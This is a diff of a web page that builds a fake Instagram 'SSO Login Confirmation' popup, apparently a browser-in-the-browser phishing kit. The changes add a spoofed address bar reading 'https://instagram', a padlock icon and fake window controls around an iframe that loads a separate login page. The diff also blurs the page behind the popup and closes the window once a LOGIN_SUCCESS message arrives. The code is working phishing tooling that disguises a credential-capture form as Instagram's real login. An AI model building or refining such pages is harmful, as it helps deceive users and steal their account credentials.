@@ -18,7 +18,7 @@
             overflow-x: hidden;
         }
 
-        /* ===== LANDING ===== */
+        /* ===== LANDING WRAPPER ===== */
         .landing {
             transition: filter 0.4s ease, transform 0.4s ease;
         }
@@ -70,7 +70,7 @@
             box-shadow: 0 10px 28px rgba(0,0,0,0.45);
         }
 
-        /* ===== LOGIN BUTTON (UNCHANGED) ===== */
+        /* ===== LOGIN BUTTON (DESIGN ONLY) ===== */
         #clickme {
             all: unset;
             display: block;
@@ -86,14 +86,39 @@
             box-shadow: 0 12px 34px rgba(253,29,29,.5);
         }
 
-        /* ===== LOGIN WINDOW (ASLI, TANPA BLUR SYSTEM) ===== */
+        /* ===== LOGIN WINDOW (CENTERED + DRAGGABLE) ===== */
         #window {
             position: fixed !important;
+
+            /* CENTER WITHOUT TRANSFORM (DRAG SAFE) */
             top: calc(50vh - 300px);
             left: calc(50vw - 400px);
+
             z-index: 9999;
             box-shadow: 0 40px 120px rgba(0,0,0,0.8);
             border-radius: 10px;
+        }
+
+        /* ===== BLUR BACKGROUND WHEN LOGIN ACTIVE ===== */
+        body:has(#window[style*="display: block"]) .landing {
+            filter: blur(8px) brightness(0.6);
+            pointer-events: none;
+            user-select: none;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.55);
+            opacity: 0;
+            transition: opacity .3s ease;
+            pointer-events: none;
+            z-index: 9998;
+        }
+
+        body:has(#window[style*="display: block"])::before {
+            opacity: 1;
         }
     </style>
 </head>
@@ -124,58 +149,45 @@
         </div>
     </section>
 
-    <button id="clickme">
+    <!-- ORIGINAL BUTTON (UNCHANGED STRUCTURE) -->
+    <button id="clickme" style="margin-left:auto; margin-right:auto; margin-top:2.5%; text-align:center; display:block;">
         Login with Instagram
     </button>
 </div>
 
-<!-- ORIGINAL WINDOW STRUCTURE (UNCHANGED) -->
+<!-- ORIGINAL LOGIN WINDOW (UNCHANGED HTML) -->
 <div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
     <div id="title-bar-width">
         <div id="title-bar">
             <div style="margin-top:5px;">
-                <img src="./logo.svg" width="20px" height="15px">
-                <span>Instagram - SSO Login Confirmation</span>
+                <img src="./logo.svg" width="20px" height="15px" id="logo">
+                <span id="logo-description">Instagram - SSO Login Confirmation</span>
             </div>
+            <div>
+                <span id="minimize">&#8212;</span>
+                <span id="square">□</span>
+                <span id="exit">✕</span>
+            </div>
+        </div>
+        <div id="url-bar">
+            <img src="./ssl.svg" width="20px" height="15px" id="ssl-padlock">
+            <span id="domain-name">https://instagram</span>
+            <span id="domain-path">/</span>
         </div>
     </div>
 
     <iframe id="content" src="login.html" frameBorder="0"></iframe>
 </div>
 
-<!-- ===== PURE BEHAVIOR SCRIPT ===== -->
+<script src="script.js"></script>
 <script>
-  const popup = document.getElementById("window");
-  const openBtn = document.getElementById("clickme");
-  const titleBar = document.getElementById("title-bar");
-
-  // OPEN
-  openBtn.addEventListener("click", () => {
-    popup.style.display = "block";
-  });
-
-  // CLOSE FROM IFRAME
-  window.addEventListener("message", e => {
-    if (e.data === "LOGIN_SUCCESS") {
-      popup.style.display = "none";
+  window.addEventListener("message", function (event) {
+    if (event.data === "LOGIN_SUCCESS") {
+      const popup = document.getElementById("window");
+      if (popup) {
+        popup.style.display = "none";
+      }
     }
-  });
-
-  // DRAG
-  let dragging = false, offsetX = 0, offsetY = 0;
-
-  titleBar.addEventListener("mousedown", e => {
-    dragging = true;
-    offsetX = e.clientX - popup.offsetLeft;
-    offsetY = e.clientY - popup.offsetTop;
-  });
-
-  document.addEventListener("mouseup", () => dragging = false);
-
-  document.addEventListener("mousemove", e => {
-    if (!dragging) return;
-    popup.style.left = (e.clientX - offsetX) + "px";
-    popup.style.top = (e.clientY - offsetY) + "px";
   });
 </script>
 
